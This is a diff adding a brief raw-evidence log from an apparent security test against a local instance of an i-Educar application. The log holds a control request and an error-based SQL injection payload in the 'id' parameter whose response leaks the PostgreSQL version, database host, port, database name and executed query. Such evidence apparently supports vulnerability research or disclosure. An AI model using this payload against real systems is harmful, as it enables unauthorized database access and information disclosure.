@@ -1,0 +1,19 @@
+# i-explorar raw evidence
+# started_at: 2026-09-11T00:17:33.375473+00:00
+# host: -03
+# target: http://127.0.0.1:8080
+
+### control: id=3
+HTTP 200
+
+--- body ---
+{"frequencia":null,"oper":"get","resource":"frequencia","msgs":[],"any_error_msg":false}
+--- end body ---
+
+### injection: id=CAST((SELECT version()) AS INT)
+HTTP 200
+
+--- body ---
+{"oper":"get","resource":"frequencia","msgs":[{"msg":"Exception: SQLSTATE[22P02]: Invalid text representation: 7 ERROR:  invalid input syntax for type integer: \"PostgreSQL 17.11 on x86_64-pc-linux-musl, compiled by gcc (Alpine 15.2.0) 15.2.0, 64-bit\" (Connection: pgsql, Host: postgres, Port: 5432, Database: ieducar, SQL:  SELECT modules.frequencia_da_matricula(CAST((SELECT version()) AS INT)); )","type":"error"}],"any_error_msg":true}
+--- end body ---
+# finished_at: 2026-09-11T00:17:33.990947+00:00
